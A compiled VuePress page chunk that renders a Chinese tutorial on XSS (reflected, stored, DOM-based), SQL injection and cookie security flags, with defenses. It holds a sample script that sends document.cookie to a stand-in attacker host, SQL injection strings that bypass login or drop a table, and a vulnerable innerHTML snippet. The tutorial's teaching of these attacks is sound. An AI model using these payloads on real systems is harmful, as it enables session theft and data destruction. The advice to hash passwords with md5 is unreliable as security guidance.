{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[67],{491:function(s,e,o){\"use strict\";o.r(e);var t=o(62),r=Object(t.a)({},(function(){var s=this,e=s.$createElement,o=s._self._c||e;return o(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[o(\"h3\",{attrs:{id:\"一、xss攻击\"}},[o(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#一、xss攻击\"}},[s._v(\"#\")]),s._v(\" 一、xss攻击\")]),s._v(\" \"),o(\"p\",[s._v(\"**XSS 即（Cross Site Scripting）中文名称为：跨站脚本攻击。**XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：\\n恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"反射型XSS\")])]),s._v(\" \"),o(\"p\",[s._v(\"反射性XSS又可以叫做非持久性XSS，在恶意链接上添加恶意脚本代码，当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。\")]),s._v(\" \"),o(\"p\",[s._v(\"因此反射型XSS的攻击步骤如下：\")]),s._v(\" \"),o(\"p\",[s._v(\"1、攻击者在url后面的参数中加入恶意攻击代码。\\n2、当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。\\n3、 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。\\n4、攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户\\n的行为，调用目标网站接口执行攻击等操作。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"存储型XSS\")])]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"存储型XSS的原理是：主要是将恶意代码上传或存储到服务器中，下次只要受害者浏览包含此恶意代码的页面就会执行恶意代码。\")])]),s._v(\" \"),o(\"p\",[s._v(\"比如我现在做了一个博客网站，然后攻击者在上面发布了一篇文章，内容是如下：\"),o(\"script\",[s._v(\"window.open(&quot;www.gongji.com?param=&quot;+document.cookie)\")]),s._v(\" 如果我没有对该文章进行任何处理的话，直接存入到数据库中，那么下一次当其他用户访问该文章的时候，服务器会从数据库中读取后然后响应给客户端，那么浏览器就会执行这段脚本，然后攻击者就会获取到用户的cookie，然后会把cookie发送到攻击者的服务器上了。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"因此存储型XSS的攻击步骤如下：\")])]),s._v(\" \"),o(\"p\",[s._v(\"1、攻击者将恶意代码提交到目标网站数据库中。\\n2、用户打开目标网站时，网站服务器将恶意代码从数据库中取出，然后拼接到html中返回给浏览器中。\\n3、用户浏览器接收到响应后解析执行，那么其中的恶意代码也会被执行。\\n4、那么恶意代码执行后，就能获取到用户数据，比如上面的cookie等信息，那么把该cookie发送到攻击者网站中，那么攻击者拿到该cookie然后会冒充该用户的行为，调用目标网站接口等违法操作。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"如何防范？\")]),s._v(\"\\n1、后端需要对提交的数据进行过滤。\\n2、前端也可以做一下处理方式，比如对script标签，将特殊字符替换成HTML编码这些等。\")]),s._v(\" \"),o(\"h5\",{attrs:{id:\"dom-based型xss\"}},[o(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#dom-based型xss\"}},[s._v(\"#\")]),s._v(\" DOM-based型XSS\")]),s._v(\" \"),o(\"p\",[s._v(\"我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。因此DOM型XSS的攻击步骤如下：\")]),s._v(\" \"),o(\"p\",[s._v(\"1、攻击者构造出特殊的URL、在其中可能包含恶意代码。\\n2、用户打开带有恶意代码的URL。\\n3、用户浏览器收到响应后解析执行。前端使用js取出url中的恶意代码并执行。\\n4、执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"DOM XSS 是基于文档对象模型的XSS。一般有如下DOM操作：\")]),s._v(\"\\n1、使用document.write直接输出数据。\\n2、使用innerHTML直接输出数据。\\n3、使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。\\n比如如下demo:\")]),s._v(\" \"),o(\"div\",{staticClass:\"language- extra-class\"},[o(\"pre\",{pre:!0,attrs:{class:\"language-text\"}},[o(\"code\",[s._v('<script>\\n  document.body.innerHTML = \"<a href=\\'\"+url+\"\\'>\"+url+\"</a>\";\\n<\\/script>\\n')])])]),o(\"h5\",{attrs:{id:\"sql注入\"}},[o(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#sql注入\"}},[s._v(\"#\")]),s._v(\" SQL注入\")]),s._v(\" \"),o(\"p\",[s._v(\"SQL注入是通过客户端的输入把SQL命令注入到一个应用的数据库中，从而执行恶意的SQL语句。\\n什么意思呢？我们来打个比方：我们有一个登录框，需要输入用户名和密码对吧，然后我们的密码输入 'or '123' = '123 这样的。\\n我们在查询用户名和密码是否正确的时候，本来执行的sql语句是：select * from user where username = '' and password = ''. 这样的sql语句，现在我们输入密码是如上这样的，然后我们会通过参数进行拼接，拼接后的sql语句就是：\\n\"),o(\"strong\",[s._v(\"select * from user where username = '' and password = ' ' or '123' = '123 ';\")]),s._v(\" 这样的了，那么会有一个or语句，只要这两个有一个是正确的话，就条件成立，因此 123 = 123 是成立的。因此验证就会被跳过。这只是一个简单的列子，比如还有密码比如是这样的：'; drop table user;, 这样的话，那么sql命令就变成了：\\n\"),o(\"strong\",[s._v(\"select * from user where username = '' and password = ''; drop table user;'\")]),s._v(\" , 那么这个时候我们会把user表直接删除了。\")]),s._v(\" \"),o(\"p\",[s._v(\"sql被攻击的原因是：sql语句伪造参数，然后对参数进行拼接后形成xss攻击的sql语句。最后会导致数据库被攻击了。\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"防范的方法：\")]),s._v(\"\\n1、我们可以使用预编译语句(PreparedStatement，这样的话即使我们使用sql语句伪造成参数，到了服务端的时候，这个伪造sql语句的参数也只是简单的字符，并不能起到攻击的作用。\\n2、数据库中密码不应明文存储的，可以对密码使用md5进行加密，为了加大破解成本，所以可以采用加盐的方式。\")]),s._v(\" \"),o(\"h5\",{attrs:{id:\"cookie安全策略\"}},[o(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#cookie安全策略\"}},[s._v(\"#\")]),s._v(\" cookie安全策略\")]),s._v(\" \"),o(\"p\",[s._v(\"在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：\")]),s._v(\" \"),o(\"p\",[o(\"strong\",[s._v(\"http-only:\")]),s._v(\" 只允许http或https请求读取cookie、JS代码是无法读取cookie的(document.cookie会显示http-only的cookie项被自动过滤掉)。发送请求时自动发送cookie.\\n\"),o(\"strong\",[s._v(\"secure-only:\")]),s._v(\" 只允许https请求读取，发送请求时自动发送cookie。\\n\"),o(\"strong\",[s._v(\"host-only:\")]),s._v(\" 只允许主机域名与domain设置完成一致的网站才能访问该cookie。\")]),s._v(\" \"),o(\"p\",[s._v(\"https://www.cnblogs.com/tugenhua0707/p/10909284.html\")])])}),[],!1,null,null,null);e.default=r.exports}}]);","extractedComments":[]}